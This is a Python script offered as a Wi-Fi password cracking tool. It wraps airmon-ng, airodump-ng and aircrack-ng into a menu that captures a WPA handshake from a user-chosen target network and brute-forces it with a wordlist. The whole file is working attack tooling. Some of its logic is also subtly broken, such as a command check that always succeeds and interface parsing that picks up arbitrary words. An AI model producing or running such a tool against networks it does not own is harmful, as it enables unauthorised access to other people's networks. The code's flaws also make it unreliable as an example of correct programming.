import os
import subprocess
import re
from termcolor import colored

# Function to check if a command exists
def command_exists(command):
    try:
        subprocess.run(["which", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except FileNotFoundError:
        return False

# Function to display the menu and get user input
def show_menu(options):
    print(colored("\nSelect an option:", "cyan"))
    for idx, (key, value) in enumerate(options.items(), start=1):
        print(f"{colored(idx, 'yellow')}. {value}")
    choice = int(input(colored("Enter your choice: ", "green")))
    if 1 <= choice <= len(options):
        return list(options.keys())[choice - 1]
    else:
        print(colored("Invalid choice. Please try again.", "red"))
        return show_menu(options)

# Function to find all available interfaces
def find_interfaces():
    result = subprocess.run(["airmon-ng"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = result.stdout.decode()
    interfaces = re.findall(r'(\w+)', output)
    return [interface for interface in interfaces if interface.isalpha()]

# Function to capture a handshake file
def capture_handshake(interface):
    print(colored("\nStarting monitor mode...", "cyan"))
    os.system(f"airmon-ng start {interface}")
    
    print(colored("\nStart capturing packets. Press Ctrl+C to stop.", "cyan"))
    subprocess.run(["airodump-ng", interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    target_bssid = input(colored("Enter the BSSID of the target network: ", "green"))
    channel = int(input(colored("Enter the channel number: ", "green")))
    
    print(colored("\nStarting handshake capture...", "cyan"))
    os.system(f"airodump-ng --bssid {target_bssid} --channel {channel} -w captured_handshake {interface}")
    
    return f"captured_handshake-01.cap"

# Function to crack the handshake file
def crack_handshake(handshake_file):
    wordlist = input(colored("Enter the path to the wordlist (e.g., /usr/share/wordlists/rockyou.txt): ", "green"))
    
    if not os.path.exists(wordlist):
        print(colored(f"The wordlist file {wordlist} does not exist. Exiting.", "red"))
        return None
    
    print(colored("\nStarting brute-force attack...", "cyan"))
    result = subprocess.run(["aircrack-ng", "-w", wordlist, handshake_file], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    output = result.stdout.decode()
    if "KEY FOUND!" in output:
        password = re.search(r"KEY: (.+)", output).group(1)
        print(colored(f"\nPassword found: {password}", "green"))
        return password
    else:
        print(colored("\nFailed to crack the password.", "red"))
        return None

# Main function
def main():
    if not command_exists("aircrack-ng"):
        print(colored("aircrack-ng is not installed. Please install it and try again.", "red"))
        return
    
    if not command_exists("hashcat"):
        print(colored("hashcat is not installed. Please install it and try again.", "red"))
        return
    
    interfaces = find_interfaces()
    
    if not interfaces:
        print(colored("No wireless interfaces found. Exiting.", "red"))
        return
    
    interface_options = {interface: f"Use {interface}" for interface in interfaces}
    selected_interface = show_menu(interface_options)
    
    handshake_file = capture_handshake(selected_interface)
    if not handshake_file:
        print(colored("Failed to capture handshake file. Exiting.", "red"))
        return
    
    password = crack_handshake(handshake_file)
    if not password:
        print(colored("Password cracking failed. Exiting.", "red"))
    else:
        print(colored(f"\nWi-Fi password cracked: {password}", "green"))

if __name__ == "__main__":
    main()
